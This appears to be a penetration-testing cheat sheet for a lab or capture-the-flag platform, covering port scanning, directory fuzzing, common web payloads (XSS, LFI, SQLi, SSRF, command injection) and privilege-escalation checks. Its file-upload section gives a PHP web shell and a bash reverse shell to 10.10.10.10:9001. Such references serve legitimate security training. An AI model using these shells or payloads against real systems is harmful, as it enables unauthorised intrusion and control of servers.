# HACKMEX Cheat Sheet

## Networking

Example format for `/etc/hosts`:

```text
10.10.10.10 www.example.com api.example.com
```

Connect to VPN:

```bash
sudo openvpn config.ovpn
```

Get VPN IP:

```bash
ip a show tun0
```

## Methodology

### Enumeration

Identify OS (Linux TTL=64, Windows TTL=128):

```bash
ping -c 1 10.10.10.10
```

Find open ports:

```bash
sudo nmap -p- --open -v -n -Pn -oN TCP0.txt -sS --min-rate 5000 10.10.10.10
```

Scan open ports:

```bash
sudo nmap -sC -sV -oN TCP1.txt -p22,80,443 10.10.10.10
```

### Web

Discover technologies:

```bash
whatweb 'http://www.example.com'
```

Discover files and directories:

```bash
ffuf -c -u 'http://www.example.com/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```bash
gobuster dir -t 64 -u 'http://www.example.com' -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Dictionary for directories: `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`

Dictionary for files: `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`

### Vulnerabilities

XSS:

```html
<b>bold text</b>
<marquee>moving</marquee>
<script>alert(1);</script>
<img src="x" onerror="alert(1)">
<svg onload="alert(1)">
```

IDOR:

```text
/account?id=1
/account?id=2
/account?id=3
```

LFI:

```text
/?page=/etc/passwd
/?page=../../../etc/passwd
/?page=../../../../../../etc/passwd
```

Command injection:

```text
command1 $(command2)
command1; command2
command1 | command2
command1 && command2
```

File upload:

```php
<?php phpinfo(); ?>
```

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

```php
<?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'"); ?>
```

SQLi:

```text
/search?id=5'
/search?id=5' OR 1=1-- -
/search?id=5' OR SLEEP(5)-- -
```

SSRF:

```text
/show?url=http://www.example.com/people
/show?url=http://10.10.10.10/test
/show?url=http://127.0.0.1/admin
/show?url=http://127.0.0.1:8000
/show?url=http://127.0.0.1:8080
```

### Exploitation

Wait for connections:

```bash
ncat -lvnp 9001
```

Reverse shells: <https://www.revshells.com/>

TTY treatment: <https://invertebr4do.github.io/tratamiento-de-tty/>

### Privilege Escalation

Permissions with `sudo`:

```bash
sudo -l
```

Find SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```
